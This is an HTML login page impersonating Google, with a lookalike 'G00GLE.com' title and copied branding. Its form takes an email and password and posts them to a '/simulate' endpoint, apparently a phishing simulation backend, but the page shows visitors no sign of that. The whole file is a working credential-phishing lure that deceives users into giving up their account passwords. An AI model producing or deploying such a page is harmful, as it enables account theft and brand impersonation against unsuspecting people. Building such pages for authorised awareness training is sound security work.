<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>G00GLE.com</title>
<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  min-height: 100vh;
  padding: 24px;
  display: grid;
  place-items: center;
  font-family: Arial, sans-serif;
  color: #202124;
  background: white;
}

.card {
  width: min(450px, 100%);
  padding: 40px;
  border: 1px solid #dadce0;
  border-radius: 28px;
}

.logo {
  font-size: 29px;
  font-weight: 600;
  letter-spacing: -2px;
  margin-bottom: 22px;
  text-align: center;
}

.b { color: #4285f4; }
.r { color: #ea4335; }
.y { color: #fbbc05; }
.g { color: #34a853; }

h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }

.notice {
  margin: 20px 0;
  padding: 12px;
  border-radius: 8px;
  background: #fff4ce;
  font-size: 13px;
  line-height: 1.5;
}

label {
  display: block;
  margin: 18px 0 7px;
  font-size: 14px;
}

input {
  width: 100%;
  padding: 14px 12px;
  border: 1px solid #747775;
  border-radius: 4px;
  font-size: 16px;
}

input:focus { outline: 2px solid #0b57d0; }

button {
  width: 100%;
  padding: 14px;
  margin-top: 24px;
  background: #0b57d0;
  color: white;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  font-weight: 500;
  cursor: pointer;
}

button:hover { background: #0842a0; }
</style>
</head>
<body>

<div class="card">
  <div class="logo">
    <span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span>
  </div>
  
  <h1>Sign in</h1>
  
  <div class="notice">
    <strong>Sign in to your Google account</strong>
  </div>

  <!-- This form explicitly passes data matching your Python keys -->
  <form action="/simulate" method="POST">
    <label for="email">Email or phone</label>
    <input type="email" id="email" name="email" required autocomplete="username">

    <label for="password">Enter your password</label>
    <input type="password" id="password" name="password" required autocomplete="current-password">

    <button type="submit">Next</button>
  </form>
</div>

</body>
</html>
